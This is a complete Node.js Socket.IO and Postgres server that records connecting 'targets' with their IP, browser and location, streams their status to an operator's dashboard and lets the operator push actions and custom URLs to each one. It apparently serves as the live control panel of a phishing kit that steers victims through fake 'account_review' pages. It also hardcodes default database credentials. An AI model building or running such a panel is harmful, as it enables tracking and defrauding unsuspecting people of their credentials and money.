import express from 'express';
import { Server } from 'socket.io';
import http from 'http';
import pkg from 'pg';
import { v4 as uuidv4 } from 'uuid';
import cors from 'cors';

const { Pool } = pkg;

// Configure your database connection
const pool = new Pool({
	user: 'postgres',
	host: 'localhost',
	database: 'atrium', // replace with your database name
	password: 'postgres', // replace with your password
	port: 5432
});

const app = express();
app.use(express.json());
app.use(cors());

// Simple API endpoint to retrieve targets by username
app.get('/api/targets/:username', async (req, res) => {
	const { username } = req.params;
	console.log(username);
	try {
		const result = await pool.query('SELECT * FROM targets WHERE belongsto = $1', [username]);
		res.json(result.rows);
	} catch (err) {
		console.error(err);
		res.status(500).send('Server error');
	}
});

const server = http.createServer(app);
const io = new Server(server, {
	cors: {
		origin: 'http://localhost:5173', // Your SvelteKit dev server
		methods: ['GET', 'POST']
	}
});

// Store target sockets by target ID: { targetID: { socket, belongsto } }
const targetSockets = new Map();

// Socket.IO logic
io.on('connection', (socket) => {
	console.log('A client connected');

	// Dashboard will call this event to join its own room
	// so it only gets updates for its own username's targets.
	socket.on('joinDashboardRoom', ({ username }) => {
		socket.join(username);
		console.log(`Dashboard joined room: ${username}`);
	});

	socket.on('updateStatus', async ({ targetID, status, currentPage }) => {
		try {
			// Update database with new status and page
			await pool.query(`UPDATE targets SET status = $1, currentpage = $2 WHERE id = $3`, [
				status,
				currentPage,
				targetID
			]);

			console.log(`Target ${targetID} updated: status=${status}, page=${currentPage}`);

			// Broadcast the update to the relevant dashboard
			io.emit('targetUpdated', { targetID, status, currentPage });
		} catch (err) {
			console.error('Error updating target status:', err);
		}
	});

	/**
	 * Target identification:
	 * The client (target) sends { belongsto, browser, location, currentPage? }
	 * We:
	 *  1. Generate a new targetID (uuid)
	 *  2. Insert a new row into the targets table
	 *  3. Store the socket in targetSockets map
	 *  4. Emit 'identified' back to the target with its new targetID
	 *  5. Emit 'targetAdded' to the belongsto (username) room so dashboards update live
	 */
	socket.on('identify', async (data) => {
		const {
			belongsto,
			browser = 'UnknownBrowser',
			location = 'Unknown Location',
			currentPage = 'account_review'
		} = data;

		// Generate unique ID for the target
		const targetID = uuidv4();
		const start_page = 'test';
		// Derive IP address from the connection (may show "::1" for localhost)
		const ip = socket.handshake.headers['x-forwarded-for'] || socket.handshake.address || '0.0.0.0';

		try {
			// Insert the new target into the database
			await pool.query(
				`INSERT INTO targets (id, ip, status, currentpage, browser, location, belongsto)
         VALUES ($1, $2, 'Online', $3, $4, $5, $6)`,
				[targetID, ip, currentPage, browser, location, belongsto]
			);

			console.log(`Inserted new target: ID=${targetID}, belongsto=${belongsto}`);
			// Store the socket reference
			targetSockets.set(targetID, { socket, belongsto });

			// Let the target know its assigned ID
			socket.emit('identified', { targetID, start_page });

			// Broadcast this new target to the dashboard room of the user
			const newTargetData = {
				id: targetID,
				ip: ip,
				status: 'Online',
				currentpage: currentPage,
				browser: browser,
				location: location,
				belongsto: belongsto
			};
			io.to(belongsto).emit('targetAdded', newTargetData);
		} catch (err) {
			console.error('Error inserting target into database:', err);
		}
	});

	/**
	 * Dashboard sends an action for a particular target.
	 * We look up the target's socket and emit 'action' to that target.
	 */
	socket.on('sendActionToTarget', async ({ targetID, action, customUrl }) => {
		const targetEntry = targetSockets.get(targetID);
		if (targetEntry) {
			targetEntry.socket.emit('action', { action, customUrl });
			console.log(`Emitted action "${action}" to target ${targetID}`);
		} else {
			console.log(`No target found with ID ${targetID}`);
		}
	});

	// Handle disconnection of any client
	socket.on('disconnect', () => {
		console.log('Client disconnected');
		for (const [tid, data] of targetSockets.entries()) {
			if (data.socket === socket) {
				targetSockets.delete(tid);
				console.log(`Removed target ${tid} from list`);
				// Update the database to mark target as Offline
				pool
					.query('UPDATE targets SET status = $1 WHERE id = $2', ['Offline', tid])
					.catch((err) => console.error('Error updating target status:', err));
				break;
			}
		}
	});
});

server.listen(3000, '0.0.0.0', () => {
	console.log('Server listening on port 3000');
});
